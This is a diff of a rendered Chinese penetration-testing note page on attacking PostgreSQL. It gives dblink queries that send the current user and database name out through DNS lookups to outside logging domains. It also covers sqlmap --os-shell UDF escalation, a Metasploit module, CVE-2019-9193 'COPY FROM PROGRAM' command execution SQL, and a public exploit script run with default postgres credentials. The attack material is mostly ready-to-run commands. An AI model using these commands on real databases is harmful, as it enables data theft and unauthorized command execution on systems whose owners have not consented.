-<span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> dblink(<span class="pl-s"><span class="pl-pds">'</span>host=<span class="pl-pds">'</span></span><span class="pl-k">||</span>(<span class="pl-k">select</span> user)<span class="pl-k">||</span><span class="pl-s"><span class="pl-pds">'</span>.djw0pg.dnslog.cn user=test dbname=test<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>SELECT version()<span class="pl-pds">'</span></span>) RETURNS (result <span class="pl-k">TEXT</span>);</pre></div>
+-- 获取当前数据库用户名称 
+SELECT * FROM dblink('host='||(select user)||'.djw0pg.dnslog.cn user=test dbname=test', 'SELECT version()') RETURNS (result TEXT);
+</code></pre>
 <p>把原来的 <code class="notranslate">djw0pg.dnslog.cn</code> 换成你自己的 <a href="https://dig.pm/" rel="nofollow">https://dig.pm/</a> 域名，同时把要带出的数据拼到前面：</p>
 <h2>示例：带出当前用户名</h2>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> dblink(<span class="pl-s"><span class="pl-pds">'</span>host=<span class="pl-pds">'</span></span> <span class="pl-k">||</span> (<span class="pl-k">select</span> user) <span class="pl-k">||</span> <span class="pl-s"><span class="pl-pds">'</span>.你的ID.dig.pm user=test dbname=test<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>SELECT version()<span class="pl-pds">'</span></span>) RETURNS (result <span class="pl-k">TEXT</span>);</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">SELECT * FROM dblink('host=' || (select user) || '.你的ID.dig.pm user=test dbname=test','SELECT version()') RETURNS (result TEXT);
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4e67e099f3b640cc716d625b38147a7b92b98989d98f8a5cafba245dde2b774a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3334303433363466663964312e77656270"><img src="https://camo.githubusercontent.com/4e67e099f3b640cc716d625b38147a7b92b98989d98f8a5cafba245dde2b774a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3334303433363466663964312e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3404364ff9d1.webp" style="max-width: 100%;"></a></p>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> dblink(<span class="pl-s"><span class="pl-pds">'</span>host=<span class="pl-pds">'</span></span><span class="pl-k">||</span>(<span class="pl-k">select</span> user)<span class="pl-k">||</span><span class="pl-s"><span class="pl-pds">'</span>.6fce4fca32.ddns.bypass.eu.org. user=test dbname=test<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>SELECT version()<span class="pl-pds">'</span></span>) RETURNS (result <span class="pl-k">TEXT</span>);</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">SELECT * FROM dblink('host='||(select user)||'.6fce4fca32.ddns.bypass.eu.org. user=test dbname=test', 'SELECT version()') RETURNS (result TEXT);
+</code></pre>
 <p>在无回显 / 盲注场景里非常关键，目标 PostgreSQL 服务器<strong>成功发起了 DNS 请求，把你要查询的数据拼进了域名里，平台也成功收到了。</strong></p>
 <h2>示例：带出当前数据库名</h2>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> dblink(<span class="pl-s"><span class="pl-pds">'</span>host=<span class="pl-pds">'</span></span><span class="pl-k">||</span>(<span class="pl-k">SELECT</span> current_database())<span class="pl-k">||</span><span class="pl-s"><span class="pl-pds">'</span>.6fce4fca32.ddns.bypass.eu.org. user=test dbname=test<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>SELECT version()<span class="pl-pds">'</span></span>) RETURNS (result <span class="pl-k">TEXT</span>);</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">SELECT * FROM dblink('host='||(SELECT current_database())||'.6fce4fca32.ddns.bypass.eu.org. user=test dbname=test', 'SELECT version()') RETURNS (result TEXT);
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/0574f43d47cc69e295a67c540427a49cb4ed57e5384dad9fd5898b31eafcc712/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3038623831356665633137392e77656270"><img src="https://camo.githubusercontent.com/0574f43d47cc69e295a67c540427a49cb4ed57e5384dad9fd5898b31eafcc712/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3038623831356665633137392e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/08b815fec179.webp" style="max-width: 100%;"></a></p>
 <p>这边数据库名和用户名一样</p>
 <h2>Postgresql命令执行</h2>
 <p>如果postgres服务账户具备/tmp目录的写入权限，那么我们可以通过用户自定义函数(UDF，</p>
 <p>user defined functions)实现任意代码执行。</p>
 <h2>使用sqlmap进行udf提权</h2>
-<div class="highlight highlight-source-shell"><pre class="notranslate">sqlmap -d <span class="pl-s"><span class="pl-pds">"</span>PostgreSQL://postgres:postgres@10.3.4.52:5432/postgres<span class="pl-pds">"</span></span> --os-shell</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">sqlmap -d "PostgreSQL://postgres:postgres@10.3.4.52:5432/postgres" --os-shell
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/578feab6c728921fbf1383e4aa3c81adeecbce27dad15988799799c37378457d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3838633162353263316535332e77656270"><img src="https://camo.githubusercontent.com/578feab6c728921fbf1383e4aa3c81adeecbce27dad15988799799c37378457d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3838633162353263316535332e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/88c1b52c1e53.webp" style="max-width: 100%;"></a></p>
 <h2>使用msf模块 exploit/linux/postgres/postgres_payload</h2>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4aa460a9104e389f3fdb730b9c1fdd08c11c8ab575656e130f199dbbfca53fbf/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6531613538323030396338642e77656270"><img src="https://camo.githubusercontent.com/4aa460a9104e389f3fdb730b9c1fdd08c11c8ab575656e130f199dbbfca53fbf/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6531613538323030396338642e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e1a582009c8d.webp" style="max-width: 100%;"></a></p>
 <h2>Postgresql <a title="CVE-2019-9193" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-j83j-hfqj-cf5p/hovercard" href="https://github.com/advisories/GHSA-j83j-hfqj-cf5p">CVE-2019-9193</a></h2>
 <p>从9.3版本开始，Postgres新增了一个COPY TO/FROM PROGRAM功能，允许数据库的超级用户以及pg_read_server_files组中的任何用户执行操作系统命令</p>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">DROP</span> <span class="pl-k">TABLE</span> IF EXISTS cmd_exec; 
-<span class="pl-k">CREATE</span> <span class="pl-k">TABLE</span> <span class="pl-en">cmd_exec</span>(cmd_output <span class="pl-k">text</span>); 
-COPY cmd_exec <span class="pl-k">FROM</span> PROGRAM <span class="pl-s"><span class="pl-pds">'</span>id<span class="pl-pds">'</span></span>; 
-<span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> cmd_exec;</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">DROP TABLE IF EXISTS cmd_exec; 
+CREATE TABLE cmd_exec(cmd_output text); 
+COPY cmd_exec FROM PROGRAM 'id'; 
+SELECT * FROM cmd_exec;
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/72a142447e5d9c2784dfd0007fcb91e252b477187d765e9b154edfaa4423a6b1/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3131393433326166623831332e706e67"><img src="https://camo.githubusercontent.com/72a142447e5d9c2784dfd0007fcb91e252b477187d765e9b154edfaa4423a6b1/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3131393433326166623831332e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/119432afb813.png" style="max-width: 100%;"></a></p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5b3016a98882a663bed20ea4fd5c1bf8fdbbe13f9ef1eecec26f1d661d7e93a3/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6137316533646534343134382e706e67"><img src="https://camo.githubusercontent.com/5b3016a98882a663bed20ea4fd5c1bf8fdbbe13f9ef1eecec26f1d661d7e93a3/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6137316533646534343134382e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a71e3de44148.png" style="max-width: 100%;"></a></p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/81e1fb9fafd3cb029b34fd606c86ec49ca35cc0b54ac0ca16991068e72b96ece/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6636306131383066376362302e706e67"><img src="https://camo.githubusercontent.com/81e1fb9fafd3cb029b34fd606c86ec49ca35cc0b54ac0ca16991068e72b96ece/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6636306131383066376362302e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f60a180f7cb0.png" style="max-width: 100%;"></a></p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/fbda1360930c1b8b3be3f2e43d7d1983efa06abc0e56095f60dcdac5d034847a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3235373764303930346134392e706e67"><img src="https://camo.githubusercontent.com/fbda1360930c1b8b3be3f2e43d7d1983efa06abc0e56095f60dcdac5d034847a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3235373764303930346134392e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/2577d0904a49.png" style="max-width: 100%;"></a></p>
 <p><strong>github脚本 <a href="https://github.com/b4keSn4ke/CVE-2019-9193">https://github.com/b4keSn4ke/CVE-2019-9193</a></strong></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">python3 cve-2019-9193.py -i <span class="pl-k">&lt;</span>target_ip<span class="pl-k">&gt;</span> -p <span class="pl-k">&lt;</span>target_port<span class="pl-k">&gt;</span> -U <span class="pl-k">&lt;</span>username<span class="pl-k">&gt;</span> -P <span class="pl-k">&lt;</span>passwd<span class="pl-k">&gt;</span> -c <span class="pl-k">&lt;</span>command<span class="pl-k">&gt;</span></pre></div>
-<div class="highlight highlight-source-shell"><pre class="notranslate">python3 cve-2019-9193.py -i 10.3.4.84 -p 5432 -U postgres -P postgres -d template1 -c <span class="pl-s"><span class="pl-pds">'</span>whoami<span class="pl-pds">'</span></span></pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">python3 cve-2019-9193.py -i &lt;target_ip&gt; -p &lt;target_port&gt; -U &lt;username&gt; -P &lt;passwd&gt; -c &lt;command&gt;
+</code></pre>
+<pre lang="bash" class="notranslate"><code class="notranslate">python3 cve-2019-9193.py -i 10.3.4.84 -p 5432 -U postgres -P postgres -d template1 -c 'whoami'
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/81f8dbed25cc56a9c1cb1ad94137eea3bd453b2a65663f4b6e087262708c3b1c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6330656236353461316463642e706e67"><img src="https://camo.githubusercontent.com/81f8dbed25cc56a9c1cb1ad94137eea3bd453b2a65663f4b6e087262708c3b1c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6330656236353461316463642e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c0eb654a1dcd.png" style="max-width: 100%;"></a></p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
